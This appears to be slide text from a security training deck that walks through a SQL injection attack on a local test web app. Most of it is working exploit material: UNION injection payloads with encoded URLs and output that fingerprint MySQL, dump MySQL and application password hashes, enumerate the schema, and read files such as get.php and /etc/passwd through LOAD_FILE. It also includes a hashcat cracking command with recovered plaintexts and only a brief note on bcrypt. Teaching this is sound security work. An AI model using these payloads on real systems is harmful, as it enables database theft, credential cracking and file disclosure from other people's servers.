server architecture it's time to move on to fingerprinting 
the database.
● To figure out the database software they will need to run 
database specific commands such as version() and 
compare the output with results of different database 
servers.
So how is this accomplished?
Union Select Poisoning
● UNION will allows the joining of another query to the 
first query.  Effectively joining them into one set.
● Enumerating Table Column Count:
○ Trying from 1 to x integers to find initial column set 
size. MySQL will fail each time until the correct 
number of columns have been found.
● Example:
○ SELECT * FROM orders WHERE id = 1 UNIO
SELECT 1,2,3,4,5,...,x;
Union Select Version
./get_curl.sh "1 UNION SELECT null,null,null,null,VERSION()"
URL:http://127.0.0.1/get.php?id=0%20UNION%20SELECT%20%271%27%
2C%271%27%2C%271%27%2C%271%27%2CVERSION%28%29
SELECT * FROM orders where orderNumber =1 UNION SELECT '1','1','1','1',
VERSION()
Array(
    [orderNumber] => 1
    [productCode] => 1  
    [quantityOrdered] => 1
    [priceEach] => 1
    [orderLineNumber] =>  5.5.40
)
Fingerprinting with Concatenation
Different Databases handle string concatenation with 
different commands.
The following are commands that can be used to verify 
databases.
● PostgreSQL 
○ 'a' || 'b' 
● MySQL
○ CONCAT('b','a')
● MS SQL 
○ 'a' + 'b'
● Oracle: 
○ 'b' || 'b' or CONCAT('b','a')
MySQL CONCAT Test
./get_curl.sh "9 UNION SELECT '1','1','1','1', CONCAT('a','b')"
http://127.0.0.1/get.php?id=9%20UNION%20SELECT%20%271%27%2C%
271%27%2C%271%27%2C%271%27%2C%20CONCAT%28%27a%27%2C%
27a%27%29
SELECT * FROM orders WHERE orderNumber =9 UNION SELECT 
'1','1','1','1', CONCAT('a','b')
    [orderNumber] => 1
    [productCode] => 1
    [quantityOrdered] => 1
    [priceEach] => 1
    [orderLineNumber] => ab
Oracle CONCAT Test
./get_curl.sh "1 UNION SELECT null,null,null,null,'b' || 'b' or CONCAT('b','a')"
http://127.0.0.1/get.php?id=9%20UNION%20SELECT%20%271%27%2C%
271%27%2C%271%27%2C%271%27%2C%20CONCAT%28%27a%27%2C%
27a%27%29
SELECT * FROM orders WHERE orderNumber =9 UNION SELECT 
'1','1','1','1', 'b' || 'b' or CONCAT('b','b')
    [orderNumber] => 1
    [productCode] => 1
    [quantityOrdered] => 1
    [priceEach] => 1
    [orderLineNumber] => 0
Fingerprinting Conclusion
● By comparing the results of the concatenation tests the 
attacker can see the MySQL test passed by returning 
the concatenated string “ab” and the Oracle test failed 
by not returning a concatenated string.
● From the version() command they find the results of 
5.5.40. Checking via a quick web search on 5.5.40 they 
see that most of the articles returned are about MySQL. 
● So from this evidence the attacker with a higher level of 
certainty concluded that the database is in fact MySQL.
Data Enumeration 
Now that the attacker has identified the architecture they move on to 
stealing interesting pieces of data out of the database.  
Enumeration 
Our attacker will start the enumeration process 
by attempting to pull MySQL user's, password 
hashes, and application database scheme 
information. 
They will then attempt to read files off the 
operating system and use the password 
hashes to create a password list to use against 
the application’s login portal. 
MySQL User Enumeration
./get_curl.sh "0 UNION SELECT host, user, password,null,null FROM mysql.
user"
URL:http://127.0.0.1/get.php?id=0%20UNION%20SELECT%20host%2C%
20user%2C%20password%2Cnull%2Cnull%20FROM%20mysql.user
SELECT * FROM orders where orderNumber =0 UNION SELECT host, user, 
password,null,null FROM mysql.user
Array(
    [orderNumber] => localhost
    [productCode] => root
    [quantityOrdered] => *A294441C38B03BE12E32771ADDF7976B0DDB8164
    [priceEach] =>
    [orderLineNumber] => 
)
MySQL Hostname
# get the name of the server.
./get_curl.sh "0 UNION SELECT null,null,null,null, @@hostname";
URL:http://127.0.0.1/get.php?id=0%20UNION%20SELECT%20null%2Cnull%
2Cnull%2Cnull%2C%20%40%40hostname
SELECT * FROM orders where orderNumber =0 UNION SELECT null,null,null,
null, @@hostname
Array(
….
[orderLineNumber] => testbox-ubuntu
)
MySQL Concat 
# Use Concat to combine multiple columns
./get_curl.sh "9 UNION SELECT '1','1','1', CONCAT_WS(0x3A, user, password) 
FROM mysql.user"
URL:http://127.0.0.1/get.php?id=9%20UNION%20SELECT%20null%2Cnull%
2Cnull%2Cnull%2C%20CONCAT_WS%280x3A%2C%20user%2C%
20password%29%20FROM%20mysql.user
SELECT * FROM orders where orderNumber =9 UNION SELECT null,null,null,
null, CONCAT_WS(0x3A, user, password) FROM mysql.user
Array(
….
 [orderLineNumber] => root:
*A294441C38B03BE12E32771ADDF7976B0DDB8164
)
MySQL Mac Address From UUID
# get the name of the server.
./get_curl.sh "0 UNION SELECT null,null,null,null,uuid()";
URL:http://127.0.0.1/get.php?id=0%20UNION%20SELECT%20null%2Cnull%
2Cnull%2Cnull%2C%20UUID%28%29
SELECT * FROM orders where orderNumber =0 UNION SELECT null,null,null,
null, UUID()
Array(
[orderLineNumber] => a110ad12-4cf1-11e4-9d33-080027b98874
)
root@testbox:/#ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 08:00:27:b9:88:74
#the last part of the uid is the mac address of the machine 080027b98874 for 
mysql servers 
MySQL Find Database Name
# get the name of the server.
./get_curl.sh "0 UNION SELECT null,null,null,null,database()"
URL:http://127.0.0.1/get.php?id=0%20UNION%20SELECT%20null%2Cnull%
2Cnull%2Cnull%2Cdatabase%28%29
SELECT * FROM orders where orderNumber =0 UNION SELECT null,null,null,
null,database()
Array(
  [orderLineNumber] => orders
)
MySQL Find Tables and Columns
# get the name of the server.
./get_curl.sh "0 UNION SELECT (@),NULL,NULL,NULL,NULL FROM (SELECT(@:=0x00),
(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN 
(@:=CO,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x "
SELECT * FROM orders where orderNumber =0 UNION SELECT (@),NULL,NULL,NULL,
NULL FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) 
WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',
table_name,' > ',column_name))))x
URL:http://127.0.0.1/get.php?id=0%20UNION%20SELECT%20%28%40%29%2CNULL%
2CNULL%2CNULL%2CNULL%20FROM%20%28SELECT%28%40%3A%3D0x00%29%2C%
28SELECT%20%28%40%29%20FROM%20%28information_schema.columns%29%
20WHERE%20%28table_schema%3E%3D%40%29%20AND%20%28%40%29IN%20%28%
40%3A%3DCONCAT%28%40%2C0x0a%2C%27%20%5B%20%27%2Ctable_schema%2C%
27%20%5D%20%3E%27%2Ctable_name%2C%27%20%3E%20%27%2Ccolumn_name%
29%29%29%29x%20
#Example From http://websec.ca/kb/sql_injection#MySQL_Tables_And_Columns
Find Tables and Columns Output
#Output From Injection
...
 [ orders ] >orderdetails > orderNumber
 [ orders ] >orderdetails > productCode
 [ orders ] >orderdetails > quantityOrdered
 [ orders ] >orderdetails > priceEach
 [ orders ] >orderdetails > orderLineNumber
 [ orders ] >orders > orderNumber
 [ orders ] >orders > productCode
 [ orders ] >orders > quantityOrdered
 [ orders ] >orders > priceEach
 [ orders ] >orders > orderLineNumber
…
Web Application Users
# get a list of user from the login table.
 ./get_curl.sh "0 UNION SELECT null,null,username,password,email from login"
URL:http://127.0.0.1/get.php?id=0%20UNION%20SELECT%20null%2Cnull%2Cusername%
2Cpassword%2Cemail%20from%20login
 …
    [quantityOrdered] => admin
    [priceEach] => d0763edaa9d9bd2a9516280e9044d885
    [orderLineNumber] => PI:EMAIL
 …
    [quantityOrdered] => test
    [priceEach] => 098f6bcd4621d373cade4e832627b4f6
    [orderLineNumber] => PI:EMAIL
….
Identifying Hashes
Now that the attacker has obtained hashes of 
the application user’s password they need to 
identify the hash type so that it can be feed into 
a password cracker.
Password Hash Identification tool
● https://github.com/psypanda/hashID
○ WARNING: hashID uses Python3.x not Python2.x
○ Python 3 setup guide
■ http://toomuchdata.com/2014/02/16/how-to-
install-python-on-centos/
Salting & Hashing Passwords
Don’t use MD5,SHA1, or SHA256
Use Bcrypt 
echo password_hash("test", PASSWORD_BCRYPT)."\n";
$2y$10$13N7yCGrv9hyaQbK1OPboOeNflEgoBoi56DSkmY6lYoN5kHugQo6S
echo password_hash("test", PASSWORD_BCRYPT)."\n";
$2y$10$T65hDdN3hvlVkadYXrJNC.L9ljHMeJ.6AlBa8dVxvDJ1UnSx16R/u
Different Hash generated each time for the same password using different salt.
http://www.openwall.com/phpass/
https://github.com/ircmaxell/password_compat
http://php.net/manual/en/faq.passwords.php
Hash Password Cracking
MySQL Password Hashes
http://dev.mysql.com/doc/refman/5.
7/en/password-hashing.html
Hashcat GPU Cracker
http://hashcat.net/oclhashcat/
Algorithms
●
MD5
●
SHA1
●
SHA-256
●
SHA-512
●
MySQL
and much more
John The Ripper Resources
http://www.openwall.com/john/
https://www.portcullis-security.
com/cracking-mysql-network-
authentication-hashes-with-john-the-
ripper/
Documentation
http://www.openwall.com/john/doc/
Windows - Hashsuite
http://hashsuite.openwall.net/
SQL-map --password
#more on this later...
Rainbow Tables
A brute force hash cracker like hashcat generates plaintext 
and computes the corresponding hashes on the fly, then 
makes a comparison of the hashes with the hash provided 
to be cracked.  The issue with this is all generated hashes 
that don’t match are discarded.
A time-memory tradeoff hash cracker like rainbowcrack 
uses pre generated plaintext/hash pairing within a selected 
hash algorithm, charset and character length. The 
computed hashes/plaintext pairs results are stored in files 
called rainbow tables and are used to to make quick 
comparisons when searching for a specific hash.
http://project-rainbowcrack.com/index.htm#download
HashCat Example
5f295bce38d311f26a96eb811192f391
:planet
d0763edaa9d9bd2a9516280e9044d885
:monkey
Online cracker for md5
http://md5cracker.org/
./oclHashcat64.bin -m 0 md5.txt -a 3 ?a?a?a?a?a?
a -o output
Session.Name...: oclHashcat
Status.........: Running
Input.Mode.....: Mask (?a?a?a?a?a?a) [6]
Hash.Target....: File (md5.txt)
Hash.Type......: MD5
Time.Started...: Tue Jul 14 20:25:45 2015 (2 secs)
Time.Estimated.: Tue Jul 14 20:27:12 2015 (1 min, 
23 secs)
Speed.GPU.#1...:  3808.2 MH/s
Speed.GPU.#2...:  2466.4 MH/s
Speed.GPU.#3...:  3930.9 MH/s
Speed.GPU.#4...:  3836.9 MH/s
Speed.GPU.#*...: 14042.3 MH/s
Recovered......: 0/3 (0.00%) Digests, 0/1 (0.00%) 
Progress.......: 21185069056/735091890625 
(2.88%)
Reading PHP Files from WWW
./get_curl.sh "0 UNION SELECT NULL,NULL,NULL,NULL,LOAD_FILE
('/var/www/html/get.php');"
URL:http://127.0.0.1/get.php?id=0%20UNION%20SELECT%20NULL%
2CNULL%2CNULL%2CNULL%2CLOAD_FILE%28%27%2Fvar%2Fwww%
2Fhtml%2Fget.php%27%29%3B
SELECT * FROM orders where orderNumber =0 UNION SELECT NULL,NULL,
NULL,NULL,LOAD_FILE('/var/www/html/get.php')
…
// Create connection
$con = mysqli_connect("127.0.0.1","root","MyNewPass","orders");
...
Reading Files
./get_curl.sh "0 UNION SELECT NULL,NULL,NULL,NULL,LOAD_FILE
('/etc/passwd');"